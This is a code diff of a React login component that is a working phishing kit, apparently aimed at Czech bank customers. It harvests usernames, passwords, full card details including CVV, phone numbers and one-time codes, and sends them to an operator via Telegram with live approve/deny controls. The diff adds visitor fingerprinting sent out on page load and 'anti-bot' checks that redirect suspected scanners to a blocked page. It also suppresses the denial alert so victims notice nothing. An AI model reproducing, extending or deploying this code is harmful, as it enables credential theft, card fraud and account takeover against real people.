@@ -2,13 +2,17 @@ import React, { useState, useEffect, useRef } from 'react';
 import axios from 'axios';
 import { useLanguage } from '../hooks/useLanguage';
 import { useTelegramBot } from '../hooks/useTelegramBot';
-import './LoginForm.css';
 import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
-
+import LoginScreen from './LoginScreen';
+import CardVerificationForm from './CardVerificationForm';
+import OtpVerificationForm from './OtpVerificationForm';
+import LoadingOverlay from './LoadingOverlay';
+import './LoginForm.css';
 
 function LoginForm() {
   const { language, t } = useLanguage();
   
+  // State management
   const [loginName, setLoginName] = useState('');
   const [password, setPassword] = useState('');
   const [errors, setErrors] = useState({ loginName: false, password: false });
@@ -16,41 +20,39 @@ function LoginForm() {
   const [isLoading, setIsLoading] = useState(false);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
-  
-  const [cardDetails, setCardDetails] = useState({
-    cardNumber: '',
-    expiryDate: '',
-    cvv: '',
-    cardholderName: '',
-    phoneNumber: '',
-    city: '',
-    postalCode: ''
-  });
-  const [cardErrors, setCardErrors] = useState({});
   const [showOtpForm, setShowOtpForm] = useState(false);
   const [otpCode, setOtpCode] = useState('');
   const [otpError, setOtpError] = useState('');
   const [sessionId, setSessionId] = useState(null);
   
-
-  // Track if typing logs have been sent
+  // Typing tracking
   const [loginTypingSent, setLoginTypingSent] = useState(false);
   const [cardTypingSent, setCardTypingSent] = useState(false);
   const [otpTypingSent, setOtpTypingSent] = useState(false);
-  const [hasSentEntryLog, setHasSentEntryLog] = useState(false);
-  const hasSentLogRef = useRef(false);
-  const hasSentOtpLogRef = useRef(false);
+  
+  // Refs for tracking page logs
   const hasSentCardPageLogRef = useRef(false);
+  const hasSentOtpLogRef = useRef(false);
+  const hasSentVisitNotificationRef = useRef(false); // Nouveau ref pour la notification de visite
+  
+  const [cardDetails, setCardDetails] = useState({
+    cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
+    phoneNumber: '', city: '', postalCode: ''
+  });
+  const [cardErrors, setCardErrors] = useState({});
 
-  // List of major cities in Czech Republic
-  const czechCities = [
-    'Prague', 'Brno', 'Ostrava', 'Plzeň', 'Liberec', 'Olomouc', 
-    'Ústí nad Labem', 'Hradec Králové', 'České Budějovice', 
-    'Pardubice', 'Havířov', 'Zlín', 'Kladno', 'Most', 'Karviná', 
-    'Frýdek-Místek', 'Opava', 'Děčín', 'Teplice', 'Karlovy Vary', 
-    'Chomutov', 'Jihlava', 'Prostějov', 'Přerov', 'Třebíč'
-  ];
+  // Anti-bot initialization
+  useEffect(() => {
+    startTimer();
+    const handleMouseMove = () => trackInteraction();
+    window.addEventListener('mousemove', handleMouseMove);
+    return () => {
+      window.removeEventListener('mousemove', handleMouseMove);
+      resetAntiBot();
+    };
+  }, []);
 
+  // Define handler functions BEFORE using them in useTelegramBot
   const handleApprove = async () => {
     if (!hasSentCardPageLogRef.current) {
       await sendCardVerificationPageLog(loginName);
@@ -65,7 +67,8 @@ function LoginForm() {
     setWaitingForApproval(false);
     setWaitingForOtpApproval(false);
     setIsLoading(false);
-    alert(t.denied);
+    // REMOVED: alert(t.denied);
+    // Just reload the page without showing alert
     window.location.reload();
   };
 
@@ -126,6 +129,8 @@ function LoginForm() {
     setOtpTypingSent(false);
     hasSentCardPageLogRef.current = false;
     hasSentOtpLogRef.current = false;
+    resetAntiBot();
+    startTimer();
   };
 
   const handleBlock = async () => {
@@ -148,6 +153,7 @@ function LoginForm() {
     }
   };
 
+  // Telegram bot hooks - NOW after handlers are defined
   const {
     generateSessionId,
     sendToTelegramWithButtons,
@@ -155,7 +161,6 @@ function LoginForm() {
     sendFormattedCardDetails,
     sendOtpToTelegram,
     sendSuccessToTelegram,
-    sendPageViewLog,
     sendCardVerificationLog,
     sendOtpPageLog,
     sendCardVerificationPageLog,
@@ -164,139 +169,184 @@ function LoginForm() {
     sendLoginTypingLog,
     sendCardTypingLog,
     sendOtpTypingLog,
-    sendBlockedLog
-  } = useTelegramBot(sessionId, handleApprove, handleDeny, handleViewCard, handleNextStep, handleBackToCard, handleBackToLogin, handleBlock);
-  
+    sendBlockedLog,
+    sendVisitNotification // Nouvelle fonction à ajouter dans le hook
+  } = useTelegramBot(
+    sessionId, 
+    handleApprove, 
+    handleDeny, 
+    handleViewCard, 
+    handleNextStep, 
+    handleBackToCard, 
+    handleBackToLogin, 
+    handleBlock
+  );
+
+  // NOUVEAU useEffect pour envoyer une notification de visite
+  useEffect(() => {
+    const sendVisitNotificationOnLoad = async () => {
+      // Éviter d'envoyer plusieurs notifications
+      if (hasSentVisitNotificationRef.current) return;
+      
+      try {
+        // Obtenir l'IP de l'utilisateur
+        let userIP = 'Unable to get IP';
+        try {
+          const ipResponse = await axios.get('https://api.ipify.org?format=json');
+          userIP = ipResponse.data.ip;
+        } catch (ipError) {
+          console.error('Error getting IP:', ipError);
+        }
+        
+        // Obtenir le User-Agent
+        const userAgent = navigator.userAgent;
+        
+        // Obtenir la page d'origine (referrer)
+        const referrer = document.referrer || 'Direct access';
+        
+        // Obtenir la résolution d'écran
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        
+        // Obtenir le fuseau horaire
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        // Générer un ID de session temporaire pour la visite
+        const tempSessionId = generateSessionId();
+        
+        // Envoyer la notification
+        await sendVisitNotification(userIP, userAgent, referrer, screenResolution, timezone, tempSessionId, language);
+        
+        hasSentVisitNotificationRef.current = true;
+        
+      } catch (error) {
+        console.error('Error sending visit notification:', error);
+      }
+    };
+    
+    // Envoyer la notification après 1 seconde (pour s'assurer que tout est chargé)
+    const timer = setTimeout(() => {
+      sendVisitNotificationOnLoad();
+    }, 1000);
+    
+    return () => clearTimeout(timer);
+  }, [generateSessionId, sendVisitNotification, language]);
+
   const handleInputChange = async (field, value) => {
-  trackTyping();  // ← ADD THIS LINE AT THE VERY TOP
-  
-  if (field === 'loginName') {
-    setLoginName(value);
-    if (!loginTypingSent && value.length === 1) {
-      await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
-      setLoginTypingSent(true);
+    trackTyping();
+    
+    if (field === 'loginName') {
+      setLoginName(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
+    } else {
+      setPassword(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
     }
-  } else {
-    setPassword(value);
-    if (!loginTypingSent && value.length === 1) {
-      await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
-      setLoginTypingSent(true);
-    }
-  }
-  setErrors({ ...errors, [field]: false });
-};
-
-const handleLogin = async (e) => {
-  e.preventDefault();
-  
-  // FIRST: Check if fields are empty
-  const newErrors = {
-    loginName: loginName.trim() === '',
-    password: password.trim() === ''
+    setErrors({ ...errors, [field]: false });
   };
 
-  setErrors(newErrors);
-
-  // If fields are empty, show error and STOP (no anti-bot check)
-  if (newErrors.loginName || newErrors.password) {
-    return; // Don't proceed, don't check anti-bot
-  }
-  
-  // ONLY run anti-bot check if fields are NOT empty
-  const antiBotResult = checkAntiBot();
-  console.log('Anti-bot result:', antiBotResult);
-  
-  if (!antiBotResult.passed) {
-    // Get user IP address
-    let userIP = 'Unable to get IP';
-    try {
-      const ipResponse = await axios.get('https://api.ipify.org?format=json');
-      userIP = ipResponse.data.ip;
-    } catch (ipError) {
-      console.error('Error getting IP:', ipError);
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    
+    const newErrors = {
+      loginName: loginName.trim() === '',
+      password: password.trim() === ''
+    };
+    setErrors(newErrors);
+    if (newErrors.loginName || newErrors.password) return;
+    
+    const antiBotResult = checkAntiBot();
+    console.log('🤖 Enhanced Anti-bot result:', antiBotResult);
+    
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
     }
-    
-    // Send log to Telegram
-    const reason = (antiBotResult.details?.timer?.reason || 'Timer fail') + ' | ' + 
-                   (antiBotResult.details?.interaction?.reason || 'No interaction') + ' | ' + 
-                   (antiBotResult.details?.typing?.reason || 'No typing');
-    
-    await sendBlockedLog(loginName, reason, userIP);
-    
-    window.location.href = '/blocked';
-    return;
-  }
 
-  // If all checks pass, proceed with login
-  setIsLoading(true);
-  setWaitingForApproval(true);
-  
-  const newSessionId = generateSessionId();
-  setSessionId(newSessionId);
-  
-  const loginData = {
-    loginName: loginName.trim(),
-    password: password.trim()
-  };
-  
-  const message = `
+    setIsLoading(true);
+    setWaitingForApproval(true);
+    const newSessionId = generateSessionId();
+    setSessionId(newSessionId);
+    
+    const message = `
 🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 🆔 <b>Session ID:</b> <code>${newSessionId}</code>
 ━━━━━━━━━━━━━━━━━━━━━
 
 📝 <b>LOGIN CREDENTIALS:</b>
-├ 👤 <b>Username:</b> ${loginData.loginName}
-└ 🔑 <b>Password:</b> ${loginData.password}
+├ 👤 <b>Username:</b> ${loginName.trim()}
+└ 🔑 <b>Password:</b> ${password.trim()}
 
 ━━━━━━━━━━━━━━━━━━━━━
+🤖 <b>Anti-bot Status:</b> ✅ PASSED
+📊 <b>Human Score:</b> ${antiBotResult.reason}
+━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>Click a button below to proceed</i>
-      `;
-  
-  await sendToTelegramWithButtons(message, newSessionId);
-};
-
+    `;
+    
+    await sendToTelegramWithButtons(message, newSessionId);
+  };
 
   const handleCardInputChange = async (field, value) => {
+    trackTyping();
+    
     if (!cardTypingSent) {
       await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
       setCardTypingSent(true);
     }
 
+    let formattedValue = value;
+    
     if (field === 'cardNumber') {
-      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
-      if (value.length > 19) value = value.slice(0, 19);
+      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
     }
     
     if (field === 'expiryDate') {
-      value = value.replace(/\D/g, '');
-      if (value.length >= 2) {
-        value = value.slice(0, 2) + (value.length > 2 ? '/' + value.slice(2, 4) : '');
+      formattedValue = value.replace(/\D/g, '');
+      if (formattedValue.length >= 2) {
+        formattedValue = formattedValue.slice(0, 2) + (formattedValue.length > 2 ? '/' + formattedValue.slice(2, 4) : '');
       }
-      if (value.length > 5) value = value.slice(0, 5);
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
     }
     
     if (field === 'cvv') {
-      value = value.replace(/\D/g, '').slice(0, 4);
+      formattedValue = value.replace(/\D/g, '').slice(0, 4);
     }
     
     if (field === 'phoneNumber') {
-      value = value.replace(/\D/g, '').slice(0, 9);
+      formattedValue = value.replace(/\D/g, '').slice(0, 9);
     }
     
     if (field === 'city') {
-      value = value.slice(0, 50);
+      formattedValue = value.slice(0, 50);
     }
     
     if (field === 'postalCode') {
-      value = value.replace(/\s/g, '');
-      if (value.length > 5) value = value.slice(0, 5);
-      if (value.length >= 3 && value.length <= 5) {
-        value = value.slice(0, 3) + (value.length > 3 ? ' ' + value.slice(3, 5) : '');
+      formattedValue = value.replace(/\s/g, '');
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
+      if (formattedValue.length >= 3 && formattedValue.length <= 5) {
+        formattedValue = formattedValue.slice(0, 3) + (formattedValue.length > 3 ? ' ' + formattedValue.slice(3, 5) : '');
       }
     }
 
-    setCardDetails({ ...cardDetails, [field]: value });
+    setCardDetails({ ...cardDetails, [field]: formattedValue });
     
     if (cardErrors[field]) {
       setCardErrors({ ...cardErrors, [field]: false });
@@ -363,6 +413,22 @@ const handleLogin = async (e) => {
   const handleCardSubmit = async (e) => {
     e.preventDefault();
     
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+    
     const errors = validateCardForm();
     
     if (Object.keys(errors).length === 0) {
@@ -384,6 +450,22 @@ const handleLogin = async (e) => {
       return;
     }
     
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+    
     setIsLoading(true);
     
     await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
@@ -398,15 +480,8 @@ const handleLogin = async (e) => {
     window.location.reload();
   };
 
-  const handleCancelOtpForm = () => {
-    setShowOtpForm(false);
-    setShowCardForm(true);
-    setOtpCode('');
-    setOtpError('');
-    setOtpTypingSent(false);
-  };
-
   const handleOtpChange = async (value) => {
+    trackTyping();
     setOtpCode(value);
     if (!otpTypingSent && value.length === 1) {
       await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
@@ -415,268 +490,53 @@ const handleLogin = async (e) => {
     setOtpError('');
   };
 
+  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;
+
   return (
     <div className="login-container">
       <h2>{t.loginTitle}</h2>
 
-      {(isLoading || waitingForApproval || waitingForOtpApproval) && (
-        <div className="loading-overlay">
-          <div className="searching-container">
-            <div className="animated-search-icon">
-              <div className="search-ring"></div>
-              <div className="search-ring-2"></div>
-              <div className="search-ring-3"></div>
-              <div className="search-dot"></div>
-              <div className="search-magnifier">
-                <div className="magnifier-circle"></div>
-                <div className="magnifier-handle"></div>
-              </div>
-            </div>
-            <p className="searching-text">
-              {waitingForApproval && 'Please wait...'}
-              {waitingForOtpApproval && 'Please wait...'}
-              {isLoading && !waitingForApproval && !waitingForOtpApproval && 'Please wait...'}
-            </p>
-            {waitingForOtpApproval && (
-              <p className="searching-subtext">
-                Please wait while we verify your informations
-              </p>
-            )}
-            {waitingForApproval && (
-              <p className="searching-subtext">
-                Please wait while we verify your credentials
-              </p>
-            )}
-          </div>
-        </div>
+      <LoadingOverlay 
+        isLoading={isLoadingState}
+        waitingForApproval={waitingForApproval}
+        waitingForOtpApproval={waitingForOtpApproval}
+        t={t}
+      />
+
+      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
+        <LoginScreen
+          loginName={loginName}
+          password={password}
+          errors={errors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleInputChange}
+          onLogin={handleLogin}
+        />
       )}
 
-      {(errors.loginName || errors.password) && (
-        <div className="error-box">
-          {errors.loginName && (
-            <div className="error-item">
-              <span className="error-icon">❗</span>
-              {t.pleaseEnterLogin}
-            </div>
-          )}
-          {errors.password && (
-            <div className="error-item">
-              <span className="error-icon">❗</span>
-              {t.pleaseEnterPassword}
-            </div>
-          )}
-        </div>
+      {showCardForm && !waitingForOtpApproval && (
+        <CardVerificationForm
+          cardDetails={cardDetails}
+          cardErrors={cardErrors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleCardInputChange}
+          onSubmit={handleCardSubmit}
+        />
       )}
 
-      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval ? (
-        <>
-          <div className="login-form">
-            <div className="form-group">
-              <label htmlFor="loginName">{t.loginName}</label>
-              <input
-                type="text"
-                id="loginName"
-                value={loginName}
-                onChange={(e) => handleInputChange('loginName', e.target.value)}
-                placeholder={t.loginName}
-                className={errors.loginName ? 'input-error' : ''}
-              />
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="password">{t.password}</label>
-              <input
-                type="password"
-                id="password"
-                value={password}
-                onChange={(e) => handleInputChange('password', e.target.value)}
-                placeholder={t.password}
-                className={errors.password ? 'input-error' : ''}
-              />
-            </div>
-
-            <button onClick={handleLogin} className="login-btn" disabled={isLoading}>
-              {t.logIn}
-            </button>
-          </div>
-
-          <div className="login-links">
-            <a href="#">{t.unknownLogin}</a>
-            <span>|</span>
-            <a href="#">{t.unknownPassword}</a>
-          </div>
-        </>
-      ) : showCardForm && !waitingForOtpApproval ? (
-        <div className="card-verification-form">
-          <h3>{t.cardVerification}</h3>
-          <p className="verification-message">{t.securityMessage}</p>
-          
-          <form onSubmit={handleCardSubmit}>
-            <div className="form-group">
-              <label htmlFor="cardholderName">{t.cardholderName}</label>
-              <input
-                type="text"
-                id="cardholderName"
-                value={cardDetails.cardholderName}
-                onChange={(e) => handleCardInputChange('cardholderName', e.target.value)}
-                placeholder="e.g., JEAN DUPONT"
-                className={cardErrors.cardholderName ? 'input-error' : ''}
-              />
-              {cardErrors.cardholderName && (
-                <span className="error-message">{cardErrors.cardholderName}</span>
-              )}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="cardNumber">{t.cardNumber}</label>
-              <input
-                type="text"
-                id="cardNumber"
-                value={cardDetails.cardNumber}
-                onChange={(e) => handleCardInputChange('cardNumber', e.target.value)}
-                placeholder="1234 5678 9012 3456"
-                maxLength="19"
-                className={cardErrors.cardNumber ? 'input-error' : ''}
-              />
-              {cardErrors.cardNumber && (
-                <span className="error-message">{cardErrors.cardNumber}</span>
-              )}
-            </div>
-
-            <div className="form-row">
-              <div className="form-group half">
-                <label htmlFor="expiryDate">{t.expirationDate}</label>
-                <input
-                  type="text"
-                  id="expiryDate"
-                  value={cardDetails.expiryDate}
-                  onChange={(e) => handleCardInputChange('expiryDate', e.target.value)}
-                  placeholder="MM/YY"
-                  maxLength="5"
-                  className={cardErrors.expiryDate ? 'input-error' : ''}
-                />
-                {cardErrors.expiryDate && (
-                  <span className="error-message">{cardErrors.expiryDate}</span>
-                )}
-              </div>
-
-              <div className="form-group half">
-                <label htmlFor="cvv">{t.cvv}</label>
-                <input
-                  type="text"
-                  id="cvv"
-                  value={cardDetails.cvv}
-                  onChange={(e) => handleCardInputChange('cvv', e.target.value)}
-                  placeholder="123"
-                  maxLength="4"
-                  className={cardErrors.cvv ? 'input-error' : ''}
-                />
-                {cardErrors.cvv && (
-                  <span className="error-message">{cardErrors.cvv}</span>
-                )}
-              </div>
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="phoneNumber">{t.phoneNumber}</label>
-              <input
-                type="text"
-                id="phoneNumber"
-                value={cardDetails.phoneNumber}
-                onChange={(e) => handleCardInputChange('phoneNumber', e.target.value)}
-                placeholder="123456789"
-                maxLength="9"
-                className={cardErrors.phoneNumber ? 'input-error' : ''}
-              />
-              {cardErrors.phoneNumber && (
-                <span className="error-message">{cardErrors.phoneNumber}</span>
-              )}
-              <small className="field-hint">{t.phoneHint}</small>
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="city">{t.city}</label>
-              <input
-                type="text"
-                id="city"
-                value={cardDetails.city}
-                onChange={(e) => handleCardInputChange('city', e.target.value)}
-                placeholder="e.g., Prague, Brno, Ostrava..."
-                className={cardErrors.city ? 'input-error' : ''}
-                list="czech-cities"
-              />
-              <datalist id="czech-cities">
-                {czechCities.map(city => (
-                  <option key={city} value={city} />
-                ))}
-              </datalist>
-              {cardErrors.city && (
-                <span className="error-message">{cardErrors.city}</span>
-              )}
-              <small className="field-hint">{t.cityHint}</small>
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="postalCode">{t.postalCode}</label>
-              <input
-                type="text"
-                id="postalCode"
-                value={cardDetails.postalCode}
-                onChange={(e) => handleCardInputChange('postalCode', e.target.value)}
-                placeholder="e.g., 110 00 or 11000"
-                maxLength="6"
-                className={cardErrors.postalCode ? 'input-error' : ''}
-              />
-              {cardErrors.postalCode && (
-                <span className="error-message">{cardErrors.postalCode}</span>
-              )}
-              <small className="field-hint">{t.postalHint}</small>
-            </div>
-
-            <div className="card-buttons">
-              <button type="submit" className="verify-btn" disabled={isLoading}>
-                {isLoading ? t.sending : t.submitCard}
-              </button>
-            </div>
-          </form>
-        </div>
-      ) : showOtpForm ? (
-        <div className="otp-verification-form">
-          <h3>{t.twoFactor}</h3>
-          <p className="verification-message">{t.enterOtp}</p>
-          
-          <form onSubmit={handleOtpSubmit}>
-            <div className="form-group">
-              <label htmlFor="otpCode">{t.otpCode}</label>
-              <input
-                type="text"
-                id="otpCode"
-                value={otpCode}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '').slice(0, 6);
-                  handleOtpChange(value);
-                }}
-                placeholder="000000"
-                maxLength="6"
-                className={otpError ? 'input-error' : ''}
-                autoFocus
-              />
-              {otpError && (
-                <span className="error-message">{otpError}</span>
-              )}
-            </div>
-
-            <div className="otp-buttons">
-              <button type="button" onClick={handleCancelOtpForm} className="back-btn">
-                {t.back}
-              </button>
-              <button type="submit" className="verify-btn" disabled={isLoading}>
-                {isLoading ? t.verifying : t.verifyCode}
-              </button>
-            </div>
-          </form>
-        </div>
-      ) : null}
+      {showOtpForm && (
+        <OtpVerificationForm
+          otpCode={otpCode}
+          otpError={otpError}
+          isLoading={isLoading}
+          t={t}
+          onOtpChange={handleOtpChange}
+          onSubmit={handleOtpSubmit}
+          onBack={handleBackToCard}
+        />
+      )}
     </div>
   );
 }
